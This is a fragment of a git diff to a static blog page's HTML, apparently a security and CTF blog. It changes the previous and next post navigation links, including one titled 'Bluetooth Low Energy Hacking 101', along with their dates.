+        var oid_likes = "likes_posts\/noSQL\/index.md"
       </script>
       
       
@@ -1201,7 +1234,7 @@ The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discover
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/ctfs/glacier-2024/">
+            <a class="flex group mr-3" href="/posts/template/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1213,11 +1246,11 @@ The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discover
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Glacier (2024)</span
+                  >Template</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time>
+                    <time datetime="2025-01-29T00:00:00&#43;00:00">29 January 2025</time>
                   
                 </span>
               </span>
@@ -1225,6 +1258,28 @@ The real treasure was hidden in Resources/assets/dexopt/www. Inside, we discover
           
         </span>
         <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/ble/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Bluetooth Low Energy Hacking 101</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
           
         </span>
       </div>
